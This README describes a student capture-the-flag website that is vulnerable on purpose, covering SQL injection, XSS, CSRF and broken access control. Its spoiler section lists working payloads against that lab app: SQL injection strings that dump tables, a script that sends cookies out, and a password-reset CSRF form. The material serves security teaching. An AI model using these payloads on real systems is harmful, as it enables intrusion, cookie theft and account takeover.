# 2023 COMP6841 My awesome project
## UPDATE ON FEB 2024
`docker compose up` to run

## Overview of attacks
Players may find that they can perform a bunch of cyber attackers to this vulnerable website. All the attacks can be found in OWASP top 10 [OWASP TOP10](https://owasp.org/www-project-top-ten/).
1. SQL Injection
    * Warm up, can you print out all users' names and passwords?
    * Shhhhh... there's a top secret in this website...
2. XSS (stored & reflected)
    * Stored XSS: typically refering to the XSS attack where malicious scripts are stored in the server(database), and executed on the user's browser.
    * Reflected XSS: unlike the stored XSS executing on the user's server, a reflected XSS attack executes on the server. Can you perform both XSS on /view-course page?
3. Broken access control
    * When selecing a course with pre-requisite and when you haven't satisfy all the requisite, the website will not allow you to select the course. However, can you bypass the restriction and add COMP9900 to your list?
4. CSRF
    * CSRF attack is when some malicious script or program causes user's browser to perform unwanted actions, normally without their consent. If you know that your friend's user email is user1@unsw.com, can you write a script to change a logged-in user's password?
5. Cryptographic Failures


## Structure
The website is built from Python3 flask as the backend, with html/css frontend and postgreSQL database. Most of the frontend template is from [https://github.com/bearlike/Pixel-Portfolio-Webite].


## Getting started
```
mkdir myctf
cd myctf
git clone git@github.com:4Christinelh4/CTF.git
```
### Running pgsql in docker
To make player's life easier and to let them focus more on attacking the website, the pgsql database is on docker. Players do not need to install and config pgsql on their machines. Follow the steps:

1. Download and install docker on your machine [docker](https://www.docker.com/)
2. Build docker image
```
[docker build -t <image name> <path to the directory where the Dockerfile is in>]
docker build -t pgsqldocker .
```
3. Create the container
```
[docker run -d --name <name of your container> -p <host port:container port> <name of the image>]
docker run -d --name pgsqlctf -p 5044:5432 pgsqldocker
```
4. Go in the container as user postgres, where there the database is
```
docker exec -it pgsqlctf psql -U postgres
```

### Start the server
```
pip3 install -r ctf/requirements.txt
python3 ctf/app.py 5044
```
*Note that in previous step, port 5432 (the port where pgsql in docker is listening on) maps to port 5044 on host machine.*

## Spoiler alert üòà
### SQL injection 1 üå∂ 
- Just use `' or 1=1; --`
### SQL injection 2 ü•ì 
- How to find out the name of the database? Try `Union` in pgsql. We firstly use 
```
' or 1=1 union select 'a', current_database(); --
```
to know the name of the database. It's comp6841db.
Then, using this to print out all tables' names in comp6841db
```
' union select '1', table_name from information_schema.tables where table_catalog='comp6841db' and table_schema = 'public'; --
```
to know table's name in this database. It's top_secret.
Then, using this to select everything in this table
```
' union select * from top_secret; -- haha 
```
### Reflected XSS üõ∏
- Thinking about what we learned in lecture, and try putting "abcd" in the question form and submit, you will find the content you typed showing in the url. This can definitely be exploited. Try replace the "abcd" with 
```
<script>document.location="http://127.0.0.1:5000/i-am-bad?q="%2Bdocument.cookie</script>
```
and see where you are redirected.
### Stored XSS ü•û
- Hmmmm, maybe try using 
```
<script>alert("the course is poorly designed")</script>
```
in any comment box :D
### CSRF üö®
- This html actually does everything that /reset-password does.
```
<html>
    <body>
        <form action="http://127.0.0.1:5000/reset-password" method="POST">
            <input type="hidden" name="email" value="z5433878@yuwei" />
            <input type="hidden" name="new_password" value="password" />
            <input type="hidden" name="confirm_password" value="password" />
            <input type="submit" value="Submit request" />
        </form>
    </body>    
</html>
```
### Broken access control üóù


## Limitations
This website is designed for cyber security learners to perform attacks. I planned to make a version that protect the website from all the above attacks, for example, with CSRF tokens implemented and sanitizations of user inputs. However, the version is not finished due to the time limit.
